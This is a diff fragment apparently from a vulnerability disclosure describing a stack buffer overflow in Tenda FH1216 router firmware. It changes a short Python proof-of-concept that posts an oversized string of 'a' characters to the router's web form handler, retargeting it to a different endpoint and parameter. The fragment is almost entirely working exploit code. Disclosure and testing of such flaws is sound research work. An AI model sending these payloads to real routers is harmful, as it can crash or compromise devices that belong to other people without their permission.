@@ -23,10 +23,10 @@ There is a stack buffer overflow vulnerability in Tenda FH1216 V1.2.0.8(8155)_EN
 import requests
 
 ip = "192.168.0.1"
-url = "http://" + ip + "/goform/WrlExtraGet"
-payload = b"a"*7000
+url = "http://" + ip + "/goform/fromSetIpBind"
+payload = b"a"*2000
 
-data = {"chkHz": payload}
+data = {"page": payload}
 response = requests.post(url, data=data)
 print(response.text)
 ```
